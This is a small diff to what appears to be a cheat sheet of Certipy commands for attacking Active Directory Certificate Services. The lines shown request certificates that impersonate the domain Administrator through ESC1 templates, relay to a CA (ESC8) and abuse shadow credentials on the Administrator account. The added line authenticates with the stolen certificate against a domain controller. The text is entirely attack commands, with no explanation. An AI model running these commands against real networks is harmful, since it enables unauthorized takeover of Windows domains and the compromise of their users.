@@ -3,3 +3,4 @@ certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -target "$CA_FQDN" 
 certipy req -u "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
 certipy relay -ca "$CA_FQDN" -template "$ESC8_TEMPLATE_NAME"
 certipy shadow auto -u "$USER@$DOMAIN" -p "$PASSWORD" -account "Administrator"
+certipy auth -pfx "$USER".pfx -dc-ip "$IP" -domain "$DOMAIN" -debug
